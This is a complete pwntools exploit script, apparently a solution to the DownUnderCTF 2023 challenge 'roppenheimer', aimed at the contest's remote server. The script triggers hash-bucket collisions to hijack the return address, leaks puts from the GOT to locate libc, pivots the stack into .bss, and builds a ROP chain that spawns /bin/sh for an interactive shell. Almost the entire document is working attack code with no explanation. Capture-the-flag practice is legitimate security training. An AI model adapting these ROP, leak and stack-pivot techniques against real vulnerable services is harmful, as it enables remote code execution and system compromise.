from pwn import *
fn = "./roppenheimer"
context.log_level = "debug"
elf = ELF(fn, checksec=False)
context.binary = elf
# libc = elf.libc
libc = ELF("./libc.so.6", checksec=False)
real = True
if real:
    # p = process(fn)
    p = remote("2023.ductf.dev", 30012)
else:
    p = gdb.debug(fn, """
    # b *0x00402ac3
    # b *0x004029c9
    c
    """)
sla = lambda x, y: p.sendlineafter(x, y)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
num_to_bytes = lambda x: str(x).encode("ascii")
def gen_fmt(start, end):
    buf = ""
    for x in range(start, end):
        buf += f"%{x}$p."
    return buf[:-1]

# ======================================
# Exploit goes here
def add_atom(key: int, val: int):
    sla(b"choice>", b"1")
    sla(b"atom>", str(key).encode("ascii"))
    sla(b"data>", str(val).encode("ascii"))


def fire_neutron(key: int):
    sla(b"choice>", b"2")
    sla(b"atom>", str(key).encode("ascii"))

def done():
    sla(b"choice>", b"3")

prime = 59

"""
rax: 26 (also bucket_size)
rbx: 28
rip: 29
"""

USEFUL = 0x004025d6
USERNAME = 0x0040a520

rop = ROP([elf])
RET = rop.find_gadget(["ret"]).address
# POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
POP_RDI_RBP = 0x004025e0  # POP RDI; NOP; POP RBP; RET;
WWW = 0x00404b14  # mov [rbp-8], rdi; pop rbp; ret;

def www(addr, val):
    return [POP_RDI_RBP, val, addr+8, WWW, 0x0]  # side-effect: 0x0-> rbp

LEAVE_RET = 0x004059e1  # LEAVE; RET
POP_RSP_RBP = 0x00404f55  # pop rsp; pop rbp; ret;
fgets_call = 0x00402d0b
# leak puts, write what where, pivot
rop_payload = [elf.got["puts"], 0x0, elf.sym["puts"]]
rop_payload += www(elf.bss(0x9f0), elf.sym["main"])
rop_payload += [POP_RSP_RBP, elf.bss(0x9f0-8), 0x0]
rop_payload = flat(rop_payload)
sla(b"name>", rop_payload)

cases = {
    25: 1,  # bucket_size
    28: USEFUL + 8,  # rip
    29: USERNAME,  # rsp after useful
}

for i in range(1, 33):
    val = 0x4100 + i
    if i in cases:
        val = cases[i]
    add_atom(prime * i, val)


fire_neutron(prime)

p.recvuntil(b"1888\n")
leak = u64(p.recvuntil(b"\n")[:-1].ljust(8, b"\0"))
log.info(f"puts GOT: {hex(leak)}")
libc.address = leak - libc.sym["puts"]
log.info(f"libc base: {hex(libc.address)}")

rop = ROP([elf, libc])
binsh = next(libc.search(b"/bin/sh\x00"))
log.info("binsh: " + hex(binsh))
rop.execve(binsh, 0, 0)
rop_payload = p64(0) + p64(elf.bss(0x800)) + rop.chain()
# rop_payload = p64(0) + p64(0) + p64(0xdeadbeef)
sla(b"name>", rop_payload)

cases = {
    5: 1,  # bucket_size
    2: USEFUL + 5,  # rip
    1: USERNAME,  # rsp after useful
}

for i in range(1, 33):
    val = 0x4100 + i
    # val = 1
    if i in cases:
        val = cases[i]
    add_atom(prime * i, val)


fire_neutron(prime)

p.interactive()